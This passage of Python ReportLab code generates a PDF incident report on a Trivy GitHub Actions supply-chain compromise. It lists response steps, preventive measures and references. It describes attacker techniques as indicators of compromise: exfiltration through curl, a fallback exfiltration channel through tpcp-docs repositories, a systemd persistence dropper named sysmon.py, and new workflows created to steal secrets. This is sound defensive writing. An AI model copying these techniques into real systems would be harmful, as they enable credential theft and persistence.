        "This includes GitHub tokens, cloud credentials, API keys, and registry passwords.",
        "<b>Revoke and regenerate</b> all GitHub PATs and deploy keys used in affected pipelines.",
        "<b>Audit cloud access logs</b> (AWS CloudTrail, Azure Activity Logs, GCP Audit Logs) for "
        "unauthorized activity using potentially-exfiltrated credentials.",
        "<b>Check for unauthorized deployments</b> or artifact modifications that may have "
        "occurred using stolen credentials.",
        "<b>Review GitHub audit logs</b> for unusual repository or organization-level actions.",
        "<b>Search for <font name='Courier'>tpcp-docs</font> repositories</b> on any GitHub "
        "account whose PAT was in scope (fallback exfiltration mechanism) [4][5].",
        "<b>Check runner logs for orphan curl processes.</b> Compromised runs show "
        "'Terminate orphan process: pid (NNNN) (curl)' &mdash; a smoking gun for exfiltration [4].",
        "<b>Check developer machines</b> for the persistence dropper: look for "
        "<font name='Courier'>~/.config/systemd/user/sysmon.py</font> and its associated "
        "systemd unit. Any machine with this file should be treated as compromised [7].",
        "<b>Trace lateral movement:</b> Once you identify which secrets were exposed, trace "
        "downstream access. Attackers have been observed creating new workflows in new branches "
        "to exfiltrate secrets from additional repositories.",
    ]
    for item in immediate:
        story.append(Paragraph(_cite_link(f"• {item}"), S_BULLET))

    story.append(Spacer(1, 8))
    story.append(Paragraph("9.2 Preventive Measures", S_H2))
    preventive = [
        "<b>Pin GitHub Actions by full SHA</b> instead of mutable version tags to prevent "
        "tag-based supply-chain attacks.",
        "<b>Use allowlists</b> for GitHub Actions in your organization settings.",
        "<b>Enable Dependabot or Renovate</b> for automated SHA-pinned action updates.",
        "<b>Minimize secrets in CI</b> — use OIDC federation for cloud access instead of "
        "long-lived credentials where possible.",
        "<b>Monitor GitHub Actions logs</b> for unusual network activity, unexpected binary "
        "downloads, or environment variable access.",
        "<b>Verify binary integrity</b> — use checksums or signatures from a trusted source "
        "before executing downloaded binaries.",
    ]
    for item in preventive:
        story.append(Paragraph(f"• {item}", S_BULLET))

    story.append(PageBreak())

    # ── 10. REFERENCES ────────────────────────────────────────────────────
    story.append(Paragraph("10. References", S_H1))
    refs = [
        ("Aqua Security Official Discussion",
         "https://github.com/aquasecurity/trivy/discussions/10425"),
        ("Aqua Security Advisory (GHSA-69fq-xp46-6x23)",
         "https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23"),
        ("Boost Security Labs: 20 Days Later: Trivy Compromise, Act II",
         "https://labs.boostsecurity.io/articles/20-days-later-trivy-compromise-act-ii/"),
        ("RoseSecurity: How a Typosquatted Domain Turned Trivy Into a Credential Stealer",
         "http://rosesecurity.dev/2026/03/20/typosquatting-trivy.html"),
        ("StepSecurity Detailed Analysis",
         "https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release"),
        ("Socket.dev Analysis",
         "https://socket.dev/supply-chain-attacks/trivy-github-actions-compromise"),
        ("Wiz Research Blog",
         "https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack"),
        ("Rami McCarthy IOC Analysis",
         "https://ramimac.me/trivy-teampcp/#iocs"),
        ("StepSecurity hackerbot-claw Blog (Original Feb 28 Incident)",
         "https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation"),
        ("Aqua Security Maintainer Statement",
         "https://github.com/aquasecurity/trivy/discussions/10425#discussioncomment-16258390"),
        ("Aqua Security Follow-up",
         "https://github.com/aquasecurity/trivy/discussions/10425#discussioncomment-16261683"),
        ("Homebrew Emergency Downgrade PR",
         "https://github.com/Homebrew/homebrew-core/pull/273304"),
    ]
    for i, (title, url) in enumerate(refs, 1):
        story.append(Paragraph(f'[{i}] <b>{title}</b><br/><font color="#1565c0">{url}</font>', S_BULLET))
        story.append(Spacer(1, 3))

    story.append(Spacer(1, 20))
    story.append(Paragraph("— End of Report —", _style("end", fontName="Helvetica-Oblique",
                           fontSize=10, textColor=CLR_GREY, alignment=TA_CENTER)))

    story.append(Spacer(1, 30))
    story.append(Paragraph(
        'Generated by trivyincident — '
        '<font color="#1565c0">https://github.com/ebvjrwork/trivyincident</font>',
        _style("credit", fontName="Helvetica", fontSize=8, leading=11,
               textColor=CLR_GREY, alignment=TA_CENTER),
    ))

    # ── BUILD PDF ─────────────────────────────────────────────────────────
    doc.build(story)
